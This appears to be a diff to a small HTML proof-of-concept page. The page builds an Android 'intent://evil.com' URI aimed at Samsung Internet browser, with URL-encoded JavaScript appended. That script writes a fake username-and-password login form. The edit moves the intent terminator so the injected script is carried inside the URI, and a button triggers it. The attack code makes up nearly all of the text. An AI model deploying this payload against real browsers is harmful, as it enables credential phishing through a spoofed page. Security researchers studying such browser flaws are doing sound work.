@@ -4,7 +4,7 @@
 <button id=btn>Runn</button>
 <script>
 const js = 'document.write("h2>Login</h2><form><input type=text placeholder=Username><br><input type=password placeholder=Password><br><button>Login</button></form>")';
-const payload = 'intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'
+const payload = 'intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser'
               + encodeURIComponent(js) + ';end';
 
 btn.onclick = () => {
